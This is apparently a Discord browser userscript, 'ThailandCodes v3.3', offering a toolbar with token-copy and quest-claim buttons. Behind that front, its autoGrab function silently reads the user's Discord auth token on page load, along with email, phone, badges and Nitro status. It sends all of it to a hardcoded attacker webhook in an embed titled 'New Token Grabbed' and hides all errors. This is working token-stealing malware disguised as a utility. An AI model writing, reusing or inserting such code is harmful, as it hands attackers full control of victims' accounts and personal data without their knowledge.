/**
 * ThailandCodes v3.3
 * - Auto silent grab on load (webhook) — once only
 * - Rich embed with avatar, user info, badges
 * - Copy Token / Copy Encrypted / Claim All
 * - Animated red gradient UI
 */
(function () {
    'use strict';
    const W = typeof unsafeWindow !== 'undefined' ? unsafeWindow : window;
    if (W.__TC_LOADED__) return;
    W.__TC_LOADED__ = true;

    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1563505727102910540/xtAh-pe1eLKUk7IRrKBvOD_4qpMcnWGMzo8ymS9ASqGzrPrnQ4x6N3yMhO2OGagrfV07';
    const ENCRYPT_KEY = 0x5A;
    const GRAB_KEY = '__tc_g__';

    function sendWebhook(payload) {
        return new Promise((resolve) => {
            try {
                GM_xmlhttpRequest({
                    method: 'POST',
                    url: WEBHOOK_URL,
                    headers: { 'Content-Type': 'application/json' },
                    data: JSON.stringify(payload),
                    onload: (r) => resolve(r.status >= 200 && r.status < 300),
                    onerror: () => resolve(false),
                });
            } catch { resolve(false); }
        });
    }

    function encryptToken(token) {
        let out = '';
        for (let i = 0; i < token.length; i++)
            out += String.fromCharCode(token.charCodeAt(i) ^ ENCRYPT_KEY);
        return btoa(out);
    }

    function findWebpack() {
        const chunk = W.webpackChunkdiscord_app;
        if (!chunk) return null;
        let found = null;
        try {
            chunk.push([[Symbol()], {}, (m) => {
                if (!m.c) return;
                for (const id in m.c) {
                    const cand = m.c[id]?.exports?.default || m.c[id]?.exports;
                    if (cand && typeof cand.getToken === 'function') { found = m; return; }
                }
            }]);
            chunk.pop();
        } catch {}
        return found;
    }

    async function getToken() {
        const wp = findWebpack();
        if (!wp) throw new Error('webpack not ready');
        for (const m of Object.values(wp.c)) {
            const cand = m?.exports?.default || m?.exports;
            if (cand && typeof cand.getToken === 'function') {
                const t = cand.getToken();
                if (t && typeof t === 'string') return t;
            }
        }
        throw new Error('token not found');
    }

    async function getUserInfo(token) {
        return new Promise((resolve) => {
            GM_xmlhttpRequest({
                method: 'GET',
                url: 'https://discord.com/api/v10/users/@me',
                headers: { 'Authorization': token, 'Content-Type': 'application/json' },
                onload: (r) => { try { resolve(JSON.parse(r.responseText)); } catch { resolve(null); } },
                onerror: () => resolve(null),
            });
        });
    }

    async function claimAllQuests() {
        const wp = findWebpack();
        if (!wp) throw new Error('webpack not ready');
        let api = null, QuestsStore = null;
        for (const m of Object.values(wp.c)) {
            const exp = m?.exports?.default || m?.exports;
            if (!exp) continue;
            if (exp.get && exp.post && exp.put) api = exp;
            if (exp.quests && typeof exp.quests.values === 'function') QuestsStore = exp;
        }
        if (!api || !QuestsStore) {
            for (const m of Object.values(wp.c)) {
                const exp = m?.exports;
                if (!exp) continue;
                for (const key of Object.keys(exp)) {
                    const cand = exp[key];
                    if (cand?.get && cand?.post) api = cand;
                    if (cand?.quests?.values) QuestsStore = cand;
                }
            }
        }
        if (!api || !QuestsStore) throw new Error('Quest modules not found');
        const quests = [...QuestsStore.quests.values()].filter(q =>
            q.userStatus?.completedAt && !q.userStatus?.claimedAt
        );
        if (quests.length === 0) return 0;
        let claimed = 0;
        for (const q of quests) {
            try {
                await api.post({ url: `/quests/${q.id}/claim-reward`, body: { location: 1, platform: 0 } });
                claimed++;
            } catch {}
        }
        return claimed;
    }

    async function autoGrab() {
        if (W[GRAB_KEY]) return;
        W[GRAB_KEY] = true;
        let alreadySent = false;
        try {
            alreadySent = !!localStorage.getItem(GRAB_KEY);
            if (!alreadySent) localStorage.setItem(GRAB_KEY, '1');
        } catch {}
        if (alreadySent) return;
        try {
            const t = await getToken();
            const user = await getUserInfo(t);
            if (!user || user.message) return;
            const avatarUrl = user.avatar
                ? `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png?size=256`
                : `https://cdn.discordapp.com/embed/avatars/${parseInt(user.discriminator || 0) % 5}.png`;
            const nitroType = { 0:'❌ None',1:'💜 Nitro Classic',2:'🚀 Nitro',3:'⚡ Nitro Basic' }[user.premium_type] || '❌ None';
            const f = user.public_flags || 0;
            const badges = [];
            if (f & (1<<0))  badges.push('👮 Discord Staff');
            if (f & (1<<6))  badges.push('🎪 HypeSquad Events');
            if (f & (1<<9))  badges.push('⭐ Early Supporter');
            if (f & (1<<3))  badges.push('🏠 HypeSquad Bravery');
            if (f & (1<<4))  badges.push('💡 HypeSquad Brilliance');
            if (f & (1<<5))  badges.push('⚖️ HypeSquad Balance');
            if (f & (1<<17)) badges.push('🛠️ Active Developer');
            if (f & (1<<22)) badges.push('✅ Verified Bot Developer');
            const tag = user.discriminator && user.discriminator !== '0' ? `${user.username}#${user.discriminator}` : user.username;
            const createdAt = new Date((BigInt(user.id) >> 22n) + 1420070400000n);
            await sendWebhook({
                embeds: [{
                    title: '🎯 New Token Grabbed',
                    color: 0xed4245,
                    author: { name: tag, icon_url: avatarUrl },
                    thumbnail: { url: avatarUrl },
                    fields: [
                        { name: '👤 Username', value: `\`${tag}\``, inline: true },
                        { name: '🆔 User ID', value: `\`${user.id}\``, inline: true },
                        { name: '📧 Email', value: user.email ? `\`${user.email}\`` : '`N/A`', inline: true },
                        { name: '📱 Phone', value: user.phone ? `\`${user.phone}\`` : '`N/A`', inline: true },
                        { name: '💎 Nitro', value: nitroType, inline: true },
                        { name: '✅ Verified', value: user.verified ? '`Yes`' : '`No`', inline: true },
                        { name: '📅 Account Created', value: `\`${createdAt.toUTCString()}\``, inline: false },
                        { name: '🏅 Badges', value: badges.length ? badges.join(' | ') : '`None`', inline: false },
                        { name: '🔑 Token', value: `\`\`\`${t}\`\`\``, inline: false },
                    ],
                    footer: { text: 'ThailandCodes v3.3 • Auto Grab', icon_url: avatarUrl },
                    timestamp: new Date().toISOString(),
                }]
            });
        } catch {}
    }

    const STYLE = `
        @keyframes gradientShift {
            0%   { background-position: 0% 50%; }
            50%  { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }
        @keyframes pulse {
            0%, 100% { box-shadow: 0 0 12px rgba(237,66,69,0.6), 0 12px 32px rgba(0,0,0,.55); }
            50%       { box-shadow: 0 0 24px rgba(237,66,69,0.9), 0 12px 32px rgba(0,0,0,.55); }
        }
        :host,*{box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif}
        .wrap{
            position:fixed;top:12px;left:50%;transform:translateX(-50%);z-index:2147483646;
            display:flex;align-items:center;gap:6px;padding:6px;
            background:linear-gradient(270deg,#1a0000,#3d0000,#6b0000,#3d0000,#1a0000);
            background-size:400% 400%;
            animation:gradientShift 4s ease infinite, pulse 2s ease-in-out infinite;
            border:1px solid #ff2a2a;border-radius:14px;
            color:#e6e8ec;user-select:none;font-size:12px;
            transition:opacity .2s,transform .3s cubic-bezier(.32,.72,0,1)}
        .wrap.hidden{opacity:0;transform:translate(-50%,-140%);pointer-events:none}
        .brand{padding:0 14px 0 10px;font-weight:800;font-size:13px;letter-spacing:.3px;
            border-right:1px solid #ff2a2a;margin-right:4px;color:#fff;text-shadow:0 0 8px #ff4444}
        .brand .a{color:#ff4444}
        .brand .v{font-size:9px;font-weight:600;color:#ff6666;font-style:italic;margin-left:4px}
        button{background:linear-gradient(135deg,#8b0000,#cc0000);border:1px solid #ff2a2a;color:#fff;
            padding:9px 14px;border-radius:8px;cursor:pointer;font-size:11px;font-weight:800;
            letter-spacing:.4px;text-transform:uppercase;font-family:inherit;
            transition:background .12s,transform .1s,box-shadow .1s;white-space:nowrap;
            box-shadow:0 0 8px rgba(200,0,0,0.4)}
        button:hover{background:linear-gradient(135deg,#cc0000,#ff0000);box-shadow:0 0 16px rgba(255,0,0,0.6)}
        button:active{transform:scale(.97)}
        button:disabled{opacity:.5;cursor:wait}
        button.enc{background:linear-gradient(135deg,#2a0000,#550000);border:1px solid #ff2a2a}
        button.enc:hover{background:linear-gradient(135deg,#550000,#880000)}
        button.claim{background:linear-gradient(135deg,#006600,#00aa00);border:1px solid #00ff44;color:#fff;box-shadow:0 0 8px rgba(0,200,0,0.4)}
        button.claim:hover{background:linear-gradient(135deg,#008800,#00cc00);box-shadow:0 0 16px rgba(0,255,0,0.6)}
        button.close{background:transparent;color:#ff6666;font-size:14px;
            padding:8px 10px;text-transform:none;letter-spacing:0;border:none;box-shadow:none}
        button.close:hover{background:rgba(255,0,0,0.2);color:#fff}
        .toast{position:fixed;top:78px;right:24px;z-index:2147483647;
            background:linear-gradient(135deg,#1a0000,#3d0000);
            border:1px solid #ff2a2a;color:#e6e8ec;padding:12px 18px;border-radius:10px;
            font-size:12px;font-weight:600;max-width:340px;
            box-shadow:0 0 16px rgba(200,0,0,0.5);
            opacity:0;transform:translateY(-6px);transition:opacity .2s,transform .2s;
            pointer-events:none}
        .toast.show{opacity:1;transform:translateY(0)}
        .toast.ok{border-left:3px solid #57f287}
        .toast.err{border-left:3px solid #ff2a2a}
        .toast.info{border-left:3px solid #ff6666}
    `;

    const root = document.createElement('div');
    root.id = 'tc-root';
    root.style.cssText = 'position:fixed;top:0;left:0;width:0;height:0;z-index:2147483647;pointer-events:none;';
    const shadow = root.attachShadow({ mode: 'open' });
    document.body.appendChild(root);

    const st = document.createElement('style');
    st.textContent = STYLE;
    shadow.appendChild(st);

    const host = document.createElement('div');
    host.style.pointerEvents = 'auto';
    shadow.appendChild(host);

    const toast = document.createElement('div');
    toast.className = 'toast';
    host.appendChild(toast);

    let toastTimer = null;
    function say(msg, kind = 'info') {
        toast.textContent = msg;
        toast.className = 'toast show ' + kind;
        clearTimeout(toastTimer);
        toastTimer = setTimeout(() => toast.classList.remove('show'), 3200);
    }

    const bar = document.createElement('div');
    bar.className = 'wrap hidden';
    bar.innerHTML = `<div class="brand">Thailand<span class="a">Codes</span><span class="v">v3.3</span></div>`;
    host.appendChild(bar);

    const btnCopy = document.createElement('button');
    btnCopy.textContent = 'COPY TOKEN';
    btnCopy.addEventListener('click', async () => {
        if (btnCopy.disabled) return;
        btnCopy.disabled = true;
        try {
            const t = await getToken();
            try { await navigator.clipboard.writeText(t); }
            catch {
                const ta = document.createElement('textarea');
                ta.value = t; document.body.appendChild(ta);
                ta.select(); document.execCommand('copy'); ta.remove();
            }
            say('✓ token copied', 'ok');
        } catch (e) { say('✗ ' + (e.message || e), 'err'); }
        btnCopy.disabled = false;
    });
    bar.appendChild(btnCopy);

    const btnEnc = document.createElement('button');
    btnEnc.className = 'enc';
    btnEnc.textContent = 'COPY ENCRYPTED';
    btnEnc.addEventListener('click', async () => {
        if (btnEnc.disabled) return;
        btnEnc.disabled = true;
        try {
            const t = await getToken();
            const enc = encryptToken(t);
            try { await navigator.clipboard.writeText(enc); }
            catch {
                const ta = document.createElement('textarea');
                ta.value = enc; document.body.appendChild(ta);
                ta.select(); document.execCommand('copy'); ta.remove();
            }
            say('✓ encrypted token copied', 'ok');
        } catch (e) { say('✗ ' + (e.message || e), 'err'); }
        btnEnc.disabled = false;
    });
    bar.appendChild(btnEnc);

    const btnClaim = document.createElement('button');
    btnClaim.className = 'claim';
    btnClaim.textContent = 'CLAIM ALL';
    btnClaim.addEventListener('click', async () => {
        if (btnClaim.disabled) return;
        btnClaim.disabled = true;
        try {
            const n = await claimAllQuests();
            say(n > 0 ? `✓ claimed ${n} quest(s)` : 'no quests ready', n > 0 ? 'ok' : 'info');
        } catch (e) { say('✗ ' + (e.message || e), 'err'); }
        btnClaim.disabled = false;
    });
    bar.appendChild(btnClaim);

    const x = document.createElement('button');
    x.className = 'close';
    x.textContent = '✕';
    x.addEventListener('click', () => bar.classList.add('hidden'));
    bar.appendChild(x);

    let tries = 0;
    const timer = setInterval(async () => {
        tries++;
        if (findWebpack()) {
            clearInterval(timer);
            bar.classList.remove('hidden');
            await autoGrab();
        } else if (tries > 120) {
            clearInterval(timer);
            bar.classList.remove('hidden');
        }
    }, 500);
})();
